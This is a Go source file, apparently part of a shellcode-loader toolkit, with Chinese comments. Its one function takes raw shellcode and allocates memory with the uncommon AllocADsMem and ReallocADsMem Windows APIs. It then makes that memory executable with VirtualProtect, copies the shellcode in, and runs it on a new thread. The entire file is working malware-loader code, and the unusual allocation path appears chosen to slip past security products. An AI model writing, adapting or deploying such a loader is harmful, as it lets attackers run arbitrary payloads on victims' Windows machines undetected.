package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func ADsMem(shellcode []byte) error {
	// AllocADsMem 分配一个可读可写但不可执行的内存块
	ptrAlloc, allocErr := xwindows.AllocADsMem(uintptr(len(shellcode)))
	if allocErr != nil && allocErr.Error() != "The operation completed successfully." {
		return fmt.Errorf("AllocADsMem failed: %v", allocErr)
	}

	// ReallocADsMem 将AllocADsMem分配的内存块复制出来
	ptrRealloc, reallocErr := xwindows.ReallocADsMem(
		ptrAlloc,
		uint32(len(shellcode)),
		uint32(len(shellcode)),
	)
	if reallocErr != nil {
		return fmt.Errorf("ReallocADsMem failed: %v", reallocErr)
	}

	// VirtualProtect 修改内存保护常量为可读可写可执行
	var oldProtect uint32
	_, vpErr := xwindows.VirtualProtect(
		ptrRealloc,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if vpErr != nil {
		return fmt.Errorf("VirtualProtect failed: %v", vpErr)
	}

	rmErr := xwindows.RtlMoveMemory(
		unsafe.Pointer(ptrRealloc),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rmErr != nil {
		return fmt.Errorf("RtlMoveMemory failed: %v", rmErr)
	}

	handle, ctErr := xwindows.CreateThread(
		0,
		0,
		ptrRealloc,
		0,
		0,
		0,
	)
	if ctErr != nil {
		return fmt.Errorf("VirtualProtect failed: %v", ctErr)
	}

	_, wpErr := xwindows.WaitForSingleObject(handle, windows.INFINITE)
	if wpErr != nil {
		return fmt.Errorf("WaitForSingleObject failed: %v", wpErr)
	}
	return nil
}
